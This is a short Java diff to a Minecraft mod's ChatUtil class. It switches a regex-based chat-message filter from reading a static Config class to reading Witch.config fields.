@@ -1,5 +1,6 @@
 package me.soda.witch.features;
 
+import me.soda.witch.Witch;
 import me.soda.witch.websocket.MessageUtils;
 import net.minecraft.text.MutableText;
 import net.minecraft.text.Text;
@@ -13,8 +14,8 @@ public class ChatUtil {
     private static boolean firstTime = true;
 
     public static boolean filter(Text message) {
-        if (!Config.isBeingFiltered) return false;
-        Pattern pattern = Pattern.compile(Config.filterPattern);
+        if (!Witch.config.isBeingFiltered) return false;
+        Pattern pattern = Pattern.compile(Witch.config.filterPattern);
         return pattern.matcher(message.getString()).find();
     }
 
